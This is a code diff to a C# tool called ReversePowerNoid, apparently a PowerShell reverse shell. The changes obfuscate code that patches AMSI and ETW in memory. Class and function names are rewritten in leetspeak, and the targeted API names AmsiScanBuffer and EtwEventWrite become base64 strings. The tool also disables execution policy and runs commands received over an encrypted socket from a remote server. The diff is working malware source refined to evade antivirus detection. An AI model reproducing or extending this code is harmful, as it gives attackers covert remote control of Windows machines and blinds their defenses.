@@ -16,13 +16,13 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 
-public class PatchAMSIAndETW {
+public class Patch4MS1And3TW {
 
     [DllImport("kernel32.dll")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
     // Thx D/Invoke!
-    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
+    public static IntPtr G3t3xp0rt4ddr3ss(IntPtr ModuleBase, string ExportName) {
         IntPtr FunctionPtr = IntPtr.Zero;
         try {
             // Traverse the PE header in memory
@@ -70,7 +70,7 @@ public class PatchAMSIAndETW {
         return FunctionPtr;
     }
 
-    private static void PatchETW() {
+    private static void Patch3TW() {
         try {
             IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
             IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
@@ -90,7 +90,7 @@ public class PatchAMSIAndETW {
                     patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
                 }
             }
-            IntPtr funcPtr = GetExportAddress(libPtr, ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
+            IntPtr funcPtr = G3t3xp0rt4ddr3ss(libPtr, (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("RXR3R" + "XZlb" + "nRXc" + "ml0ZQ" + "=="))));
             IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
             UInt32 oldProtect = 0;
             VirtualProtect(funcPtr, (UIntPtr)patchbyte.Length, 0x40, out oldProtect);
@@ -103,7 +103,7 @@ public class PatchAMSIAndETW {
         }
     }
 
-    private static void PatchAMSI() {
+    private static void Patch4MS1() {
         try {
             IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
             byte[] patchbyte = new byte[0];
@@ -125,7 +125,7 @@ public class PatchAMSIAndETW {
             IntPtr libPtr;
             try{ libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("YW1zaS5kbGw="))).Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch{ libPtr = IntPtr.Zero; }
             if (libPtr != IntPtr.Zero) {
-                IntPtr funcPtr = GetExportAddress(libPtr, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
+                IntPtr funcPtr = G3t3xp0rt4ddr3ss(libPtr, (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("QW1za" + "VNjYW5" + "CdWZ" + "mZXI="))));
                 IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
                 UInt32 oldProtect = 0;
                 VirtualProtect(funcPtr, (UIntPtr)patchbyte.Length, 0x40, out oldProtect);
@@ -140,8 +140,8 @@ public class PatchAMSIAndETW {
     }
 
     public static void Main() {
-        PatchAMSI();
-        PatchETW();
+        Patch4MS1();
+        Patch3TW();
     }
 }
 
@@ -565,7 +565,7 @@ public class ReversePowerNoid
             //Console.WriteLine("   [-] It seems that we failed to disable ETW :')");
             return false;
         }
-        PatchAMSIAndETW.Main();
+        Patch4MS1And3TW.Main();
         return true;
     }
 
@@ -634,7 +634,6 @@ public class ReversePowerNoid
 
     public static void Send(Socket handler, String data) {
         string dataEnc = EncryptStringAES(data, Password);
-        // Convert the string data to byte data using ASCII encoding.
         byte[] byteData = Encoding.ASCII.GetBytes(dataEnc);
         handler.Send(byteData);
     }
@@ -642,6 +641,9 @@ public class ReversePowerNoid
     public static string Receive(Socket handler) {
         byte[] bytes = new byte[501474836];  
         int bytesRec = handler.Receive(bytes);
+        if (String.IsNullOrEmpty(Encoding.ASCII.GetString(bytes,0,bytesRec))) {
+            return String.Empty;
+        }
         return DecryptStringAES(Encoding.ASCII.GetString(bytes,0,bytesRec), Password);
     }
 
@@ -655,13 +657,7 @@ public class ReversePowerNoid
             return true;
     }
 
-    public static void StartReversePowernoid(string ServerAddress, int port)
-    {
-        // I had to implement a custom PSHost in order to get Write-Host to work.
-        // This wouldn't be an issue if all PowerShell scripts used Write-Output
-        // instead of Write-Host, but enough use Write-Host that it's worth it
-        // to implement a custom PSHost
-
+    public static void StartReversePowernoid(string ServerAddress, int port) {
         CustomPSHost host = new CustomPSHost();
         var state = InitialSessionState.CreateDefault();
         state.AuthorizationManager = null;                  // Bypass PowerShell execution policy
@@ -692,7 +688,6 @@ public class ReversePowerNoid
                 Socket connhandler = TryConnect(ServerAddress, port);
                 while(true)
                 {
-                    // get pwd and sent to the server
                     Send(connhandler, ExecuteCommand("(Resolve-Path .\\).Path", ps, host).Trim());
                     string command = Receive(connhandler).Trim();
                     if (String.Equals(command, "exit", StringComparison.OrdinalIgnoreCase)) {
